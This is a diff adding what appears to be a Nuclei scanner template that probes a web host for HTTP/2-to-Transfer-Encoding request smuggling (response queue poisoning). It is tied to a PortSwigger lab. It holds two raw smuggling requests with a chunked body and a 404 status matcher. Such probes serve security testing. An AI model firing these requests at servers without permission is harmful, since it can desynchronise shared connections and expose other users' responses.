@@ -1,0 +1,35 @@
+id: confirming-h2-te
+
+info:
+  name: Response queue poisoning via H2.TE request smuggling
+  author: FIR_UIII
+  severity: info
+  reference: https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling
+
+http:
+  - raw:
+    - |+
+      POST / HTTP/2
+      Host: {{Hostname}}
+      Transfer-Encoding: chunked
+
+      0
+
+      SMUGGLED
+      
+
+    - |+
+      POST / HTTP/2
+      Host: {{Hostname}}
+      Transfer-Encoding: chunked
+
+      0
+
+      SMUGGLED
+
+
+    unsafe: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==404'
